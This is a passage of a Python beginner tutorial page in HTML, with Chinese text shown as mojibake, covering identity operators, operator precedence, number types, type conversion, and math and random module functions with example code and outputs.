class="token punctuation">(</span>a <span class="token keyword">is</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a å’Œ b æœ‰ç›¸åŒçš„æ ‡è¯†"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a å’Œ b æ²¡æœ‰ç›¸åŒçš„æ ‡è¯†"</span><span class="token punctuation">)</span><span class="token comment"># a å’Œ b æ²¡æœ‰ç›¸åŒçš„æ ‡è¯†</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">is</span> <span class="token keyword">not</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a å’Œ b æ²¡æœ‰ç›¸åŒçš„æ ‡è¯†"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a å’Œ b æœ‰ç›¸åŒçš„æ ‡è¯†"</span><span class="token punctuation">)</span><span class="token comment"># a å’Œ b æ²¡æœ‰ç›¸åŒçš„æ ‡è¯†    </span><span class="token triple-quoted-string string">'''a å’Œ b æœ‰ç›¸åŒçš„æ ‡è¯†a å’Œ b æœ‰ç›¸åŒçš„æ ‡è¯†a å’Œ b æ²¡æœ‰ç›¸åŒçš„æ ‡è¯†a å’Œ b æ²¡æœ‰ç›¸åŒçš„æ ‡è¯†'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä¼˜å…ˆçº§"><a href="#ä¼˜å…ˆçº§" class="headerlink" title="ä¼˜å…ˆçº§"></a>ä¼˜å…ˆçº§</h3><table><thead><tr><th align="left">è¿ç®—ç¬¦</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">**</td><td align="left">æŒ‡æ•° (æœ€é«˜ä¼˜å…ˆçº§)</td></tr><tr><td align="left">~ + -</td><td align="left">æŒ‰ä½ç¿»è½¬, ä¸€å…ƒåŠ å·å’Œå‡å· (æœ€åä¸¤ä¸ªçš„æ–¹æ³•åä¸º +@ å’Œ -@)</td></tr><tr><td align="left">* / % //</td><td align="left">ä¹˜ï¼Œé™¤ï¼Œæ±‚ä½™æ•°å’Œå–æ•´é™¤</td></tr><tr><td align="left">+ -</td><td align="left">åŠ æ³•å‡æ³•</td></tr><tr><td align="left">&gt;&gt; &lt;&lt;</td><td align="left">å³ç§»ï¼Œå·¦ç§»è¿ç®—ç¬¦</td></tr><tr><td align="left">&amp;</td><td align="left">ä½ â€˜ANDâ€™</td></tr><tr><td align="left">^ |</td><td align="left">ä½è¿ç®—ç¬¦</td></tr><tr><td align="left">&lt;= &lt; &gt; &gt;=</td><td align="left">æ¯”è¾ƒè¿ç®—ç¬¦</td></tr><tr><td align="left">== !=</td><td align="left">ç­‰äºè¿ç®—ç¬¦</td></tr><tr><td align="left">= %= /= //= -= += *= **=</td><td align="left">èµ‹å€¼è¿ç®—ç¬¦</td></tr><tr><td align="left">is is not</td><td align="left">èº«ä»½è¿ç®—ç¬¦</td></tr><tr><td align="left">in not in</td><td align="left">æˆå‘˜è¿ç®—ç¬¦</td></tr><tr><td align="left">not and or</td><td align="left">é€»è¾‘è¿ç®—ç¬¦</td></tr></tbody></table><h2 id="æ•°å­—-Number"><a href="#æ•°å­—-Number" class="headerlink" title="æ•°å­—(Number)"></a>æ•°å­—(Number)</h2><p>ç›´æ¥åˆ›å»ºï¼Œä¸ç”¨ç‰¹åˆ«å®šä¹‰ç±»å‹</p><p>æ”¯æŒintã€floatã€boolã€complexï¼ˆå¤æ•°ï¼‰</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">var <span class="token operator">=</span> <span class="token number">1</span>var1 <span class="token operator">=</span> <span class="token string">'test'</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token comment"># 1 test</span><span class="token keyword">del</span> var<span class="token punctuation">,</span> var1 <span class="token comment"># åˆ é™¤å¯¹è±¡</span><span class="token comment"># 8æˆ–è€…16è¿›åˆ¶è¡¨ç¤ºæ•°å­—</span>var <span class="token operator">=</span> <span class="token number">0x99</span>var1 <span class="token operator">=</span> <span class="token number">0o43</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token comment"># 153 35</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¿ç®—"><a href="#è¿ç®—" class="headerlink" title="è¿ç®—"></a>è¿ç®—</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">6.3</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment"># ä¸æµ®ç‚¹æ•°è¿ç®—ç»“æœä¸ºæµ®ç‚¹æ•°</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">**</span> <span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># ä¹˜æ–¹</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">6.5</span> <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment"># å‘ä¸‹å–æ•´</span>var <span class="token operator">=</span> <span class="token string">'test'</span>  <span class="token comment"># èµ‹å€¼</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment"># å–ä½™</span><span class="token number">3</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token keyword">print</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token comment"># å˜é‡_æ˜¯ä¸Šä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼</span><span class="token triple-quoted-string string">'''4262.192.01'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ•°æ®ç±»å‹è½¬æ¢å‡½æ•°"><a href="#æ•°æ®ç±»å‹è½¬æ¢å‡½æ•°" class="headerlink" title="æ•°æ®ç±»å‹è½¬æ¢å‡½æ•°"></a>æ•°æ®ç±»å‹è½¬æ¢å‡½æ•°</h3><h5 id="class-int-x-base-10-1"><a href="#class-int-x-base-10-1" class="headerlink" title="class int(x, base=10)"></a><code>class int(x, base=10)</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># xä¸ºæ•°å€¼å‹æ—¶,ä¸å†™base,ç›´æ¥å–æ•´,xä¸ºstræ—¶,baseä¸ºè½¬æ¢å‰çš„è¿›åˆ¶</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">3.6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11.2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''3-1118'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="class-float-x-1"><a href="#class-float-x-1" class="headerlink" title="class float([x])"></a><code>class float([x])</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å°†æ•´æ•°å’Œå­—ç¬¦ä¸²è½¬æ¢æˆæµ®ç‚¹æ•°</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">float</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">float</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11.2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''1.0-11.212.0'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="class-complex-real-imag-1"><a href="#class-complex-real-imag-1" class="headerlink" title="class complex([real[, imag]])"></a><code>class complex([real[, imag]])</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># åˆ›å»ºä¸€ä¸ªå¤æ•°</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">2j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token string">'1+3j'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''(1+0j)(1+2j)(1+3j)(1+2j)'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ•°å­¦å‡½æ•°"><a href="#æ•°å­¦å‡½æ•°" class="headerlink" title="æ•°å­¦å‡½æ•°"></a>æ•°å­¦å‡½æ•°</h3><table><thead><tr><th><a href="https://www.runoob.com/python3/python3-func-number-abs.html">abs(x)</a></th><th>è¿”å›æ•°å­—çš„ç»å¯¹å€¼ï¼Œå¦‚abs(-10) è¿”å› 10</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/python3/python3-func-number-ceil.html">ceil(x)</a></td><td>è¿”å›æ•°å­—çš„ä¸Šå…¥æ•´æ•°ï¼Œå¦‚math.ceil(4.1) è¿”å› 5</td></tr><tr><td>cmp(x, y)</td><td>å¦‚æœ x &lt; y è¿”å› -1, å¦‚æœ x == y è¿”å› 0, å¦‚æœ x &gt; y è¿”å› 1ã€‚ <strong>Python 3 å·²åºŸå¼ƒï¼Œä½¿ç”¨ (x&gt;y)-(x&lt;y) æ›¿æ¢</strong>ã€‚</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-exp.html">exp(x)</a></td><td>è¿”å›eçš„xæ¬¡å¹‚(ex),å¦‚math.exp(1) è¿”å›2.718281828459045</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-fabs.html">fabs(x)</a></td><td>è¿”å›æ•°å­—çš„ç»å¯¹å€¼ï¼Œå¦‚math.fabs(-10) è¿”å›10.0</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-floor.html">floor(x)</a></td><td>è¿”å›æ•°å­—çš„ä¸‹èˆæ•´æ•°ï¼Œå¦‚math.floor(4.9)è¿”å› 4</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-log.html">log(x)</a></td><td>å¦‚math.log(math.e)è¿”å›1.0,math.log(100,10)è¿”å›2.0</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-log10.html">log10(x)</a></td><td>è¿”å›ä»¥10ä¸ºåŸºæ•°çš„xçš„å¯¹æ•°ï¼Œå¦‚math.log10(100)è¿”å› 2.0</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-max.html">max(x1, x2,â€¦)</a></td><td>è¿”å›ç»™å®šå‚æ•°çš„æœ€å¤§å€¼ï¼Œå‚æ•°å¯ä»¥ä¸ºåºåˆ—ã€‚</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-min.html">min(x1, x2,â€¦)</a></td><td>è¿”å›ç»™å®šå‚æ•°çš„æœ€å°å€¼ï¼Œå‚æ•°å¯ä»¥ä¸ºåºåˆ—ã€‚</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-modf.html">modf(x)</a></td><td>è¿”å›xçš„æ•´æ•°éƒ¨åˆ†ä¸å°æ•°éƒ¨åˆ†ï¼Œä¸¤éƒ¨åˆ†çš„æ•°å€¼ç¬¦å·ä¸xç›¸åŒï¼Œæ•´æ•°éƒ¨åˆ†ä»¥æµ®ç‚¹å‹è¡¨ç¤ºã€‚</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-pow.html">pow(x, y)</a></td><td>x**y è¿ç®—åçš„å€¼ã€‚</td></tr><tr><td>[round(x <a href="https://www.runoob.com/python3/python3-func-number-round.html">,n])</a></td><td>è¿”å›æµ®ç‚¹æ•° x çš„å››èˆäº”å…¥å€¼ï¼Œå¦‚ç»™å‡º n å€¼ï¼Œåˆ™ä»£è¡¨èˆå…¥åˆ°å°æ•°ç‚¹åçš„ä½æ•°ã€‚<strong>å…¶å®å‡†ç¡®çš„è¯´æ˜¯ä¿ç•™å€¼å°†ä¿ç•™åˆ°ç¦»ä¸Šä¸€ä½æ›´è¿‘çš„ä¸€ç«¯ã€‚</strong></td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-number-sqrt.html">sqrt(x)</a></td><td>è¿”å›æ•°å­—xçš„å¹³æ–¹æ ¹ã€‚</td></tr></tbody></table><h3 id="éšæœºæ•°å‡½æ•°"><a href="#éšæœºæ•°å‡½æ•°" class="headerlink" title="éšæœºæ•°å‡½æ•°"></a>éšæœºæ•°å‡½æ•°</h3><table><thead><tr><th align="left">å‡½æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-choice.html">choice(seq)</a></td><td align="left">ä»åºåˆ—çš„å…ƒç´ ä¸­éšæœºæŒ‘é€‰ä¸€ä¸ªå…ƒç´ ï¼Œæ¯”å¦‚random.choice(range(10))ï¼Œä»0åˆ°9ä¸­éšæœºæŒ‘é€‰ä¸€ä¸ªæ•´æ•°ã€‚</td></tr><tr><td align="left">[randrange (<a href="https://www.runoob.com/python3/python3-func-number-randrange.html">start,] stop [,step])</a></td><td align="left">ä»æŒ‡å®šèŒƒå›´å†…ï¼ŒæŒ‰æŒ‡å®šåŸºæ•°é€’å¢çš„é›†åˆä¸­è·å–ä¸€ä¸ªéšæœºæ•°ï¼ŒåŸºæ•°é»˜è®¤å€¼ä¸º 1</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-random.html">random()</a></td><td align="left">éšæœºç”Ÿæˆä¸‹ä¸€ä¸ªå®æ•°ï¼Œå®ƒåœ¨[0,1)èŒƒå›´å†…ã€‚</td></tr><tr><td align="left">[seed(<a href="https://www.runoob.com/python3/python3-func-number-seed.html">x])</a></td><td align="left">æ”¹å˜éšæœºæ•°ç”Ÿæˆå™¨çš„ç§å­seedã€‚å¦‚æœä½ ä¸äº†è§£å…¶åŸç†ï¼Œä½ ä¸å¿…ç‰¹åˆ«å»è®¾å®šseedï¼ŒPythonä¼šå¸®ä½ é€‰æ‹©seedã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-shuffle.html">shuffle(lst)</a></td><td align="left">å°†åºåˆ—çš„æ‰€æœ‰å…ƒç´ éšæœºæ’åº</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-uniform.html">uniform(x, y)</a></td><td align="left">éšæœºç”Ÿæˆä¸‹ä¸€ä¸ªå®æ•°ï¼Œå®ƒåœ¨[x,y]èŒƒå›´å†…ã€‚</td></tr></tbody></table><h3 id="ä¸‰è§’å‡½æ•°"><a href="#ä¸‰è§’å‡½æ•°" class="headerlink" title="ä¸‰è§’å‡½æ•°"></a>ä¸‰è§’å‡½æ•°</h3><p>PythonåŒ…æ‹¬ä»¥ä¸‹ä¸‰è§’å‡½æ•°ï¼š</p><table><thead><tr><th align="left">å‡½æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-acos.html">acos(x)</a></td><td align="left">è¿”å›xçš„åä½™å¼¦å¼§åº¦å€¼ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-asin.html">asin(x)</a></td><td align="left">è¿”å›xçš„åæ­£å¼¦å¼§åº¦å€¼ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-atan.html">atan(x)</a></td><td align="left">è¿”å›xçš„åæ­£åˆ‡å¼§åº¦å€¼ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-atan2.html">atan2(y, x)</a></td><td align="left">è¿”å›ç»™å®šçš„ X åŠ Y åæ ‡å€¼çš„åæ­£åˆ‡å€¼ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-cos.html">cos(x)</a></td><td align="left">è¿”å›xçš„å¼§åº¦çš„ä½™å¼¦å€¼ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-hypot.html">hypot(x, y)</a></td><td align="left">è¿”å›æ¬§å‡ é‡Œå¾·èŒƒæ•° sqrt(x<em>x + y</em>y)ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-sin.html">sin(x)</a></td><td align="left">è¿”å›çš„xå¼§åº¦çš„æ­£å¼¦å€¼ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-tan.html">tan(x)</a></td><td align="left">è¿”å›xå¼§åº¦çš„æ­£åˆ‡å€¼ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-degrees.html">degrees(x)</a></td><td align="left">å°†å¼§åº¦è½¬æ¢ä¸ºè§’åº¦,å¦‚degrees(math.pi/2) ï¼Œ è¿”å›90.0</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-number-radians.html">radians(x)</a></td><td align="left">å°†è§’åº¦è½¬æ¢ä¸ºå¼§åº¦</td></tr></tbody></table><h3 id="æ•°å­¦å¸¸é‡"><a href="#æ•°å­¦å¸¸é‡" class="headerlink" title="æ•°å­¦å¸¸é‡"></a>æ•°å­¦å¸¸é‡</h3><table><thead><tr><th align="left">å¸¸é‡</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">pi</td><td align="left">æ•°å­¦å¸¸é‡ piï¼ˆåœ†å‘¨ç‡ï¼Œä¸€èˆ¬ä»¥Ï€æ¥è¡¨ç¤ºï¼‰</td></tr><tr><td align="left">e</td><td align="left">æ•°å­¦å¸¸é‡ eï¼Œeå³è‡ªç„¶å¸¸æ•°ï¼ˆè‡ªç„¶å¸¸æ•°ï¼‰ã€‚</td></tr></tbody></table><h3 id="å‡½æ•°ç¤ºä¾‹"><a href="#å‡½æ•°ç¤ºä¾‹" class="headerlink" title="å‡½æ•°ç¤ºä¾‹"></a>å‡½æ•°ç¤ºä¾‹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> math  <span class="token comment"># å¯¼å…¥ math æ¨¡å—</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"abs(-40) : "</span><span class="token punctuation">,</span> <span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># å†…ç½®</span><span class="token comment"># abs(-40) :  40</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.ceil(-45.17) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45.17</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.ceil(-45.17) :  -45</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.exp(-45.17) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45.17</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.exp(-45.17) :  2.4150062132629406e-20</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.fabs(-45.17) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>fabs<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45.17</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.fabs(-45.17) :  45.17</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.floor(-45.17) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>floor<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">45.17</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.floor(-45.17) :  -46</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.log(100.12) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token number">100.12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.log(100.12) :  4.6063694665635735</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.log10(100.12) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>log10<span class="token punctuation">(</span><span class="token number">100.12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.log10(100.12) :  2.0005208409361854</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"max(80, 100, 1000) : "</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># max(80, 100, 1000) :  1000</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"min(80, 100, 1000) : "</span><span class="token punctuation">,</span> <span class="token builtin">min</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># min(80, 100, 1000) :  80</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.modf(100.12) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>modf<span class="token punctuation">(</span><span class="token number">100.12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.modf(100.12) :  (0.12000000000000455, 100.0)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.pow(100, 2) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.pow(100, 2) :  10000.0</span><span class="token comment"># ä½¿ç”¨å†…ç½®ï¼ŒæŸ¥çœ‹è¾“å‡ºç»“æœåŒºåˆ«</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"pow(100, 2) : "</span><span class="token punctuation">,</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># pow(100, 2) :  10000</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"round(-100.000056, 3) : "</span><span class="token punctuation">,</span> <span class="token builtin">round</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100.000056</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># round(-100.000056, 3) :  -100.0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"math.sqrt(100) : "</span><span class="token punctuation">,</span> math<span class="token punctuation">.</span>sqrt<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># math.sqrt(100) :  10.0</span><span class="token keyword">import</span> random<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ä» range(100) è¿”å›ä¸€ä¸ªéšæœºæ•° : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ä» range(100) è¿”å›ä¸€ä¸ªéšæœºæ•° :  67</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ä»åˆ—è¡¨ä¸­ [1, 2, 3, 5, 9]) è¿”å›ä¸€ä¸ªéšæœºå…ƒç´  : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ä»åˆ—è¡¨ä¸­ [1, 2, 3, 5, 9]) è¿”å›ä¸€ä¸ªéšæœºå…ƒç´  :  5</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ä»å­—ç¬¦ä¸²ä¸­ 'Runoob' è¿”å›ä¸€ä¸ªéšæœºå­—ç¬¦ : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token string">'Runoob'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ä» 1-100 ä¸­é€‰å–ä¸€ä¸ªå¥‡æ•°</span><span class="token comment">#ä»å­—ç¬¦ä¸²ä¸­ 'Runoob' è¿”å›ä¸€ä¸ªéšæœºå­—ç¬¦ :  n</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"randrange(1,100, 2) : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># randrange(1,100, 2) :  45</span><span class="token comment"># ä» 0-99 é€‰å–ä¸€ä¸ªéšæœºæ•°</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"randrange(100) : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># randrange(100) :  11</span><span class="token comment"># ç¬¬ä¸€ä¸ªéšæœºæ•°</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"random() : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># random() :  0.7601111373084349</span><span class="token comment"># ç¬¬äºŒä¸ªéšæœºæ•°</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"random() : "</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># random() :  0.9598748666088929</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"éšæœºæ’åºåˆ—è¡¨ : "</span><span class="token punctuation">,</span> list1<span class="token punctuation">)</span><span class="token comment"># éšæœºæ’åºåˆ—è¡¨ :  [10, 5, 20, 16]</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token 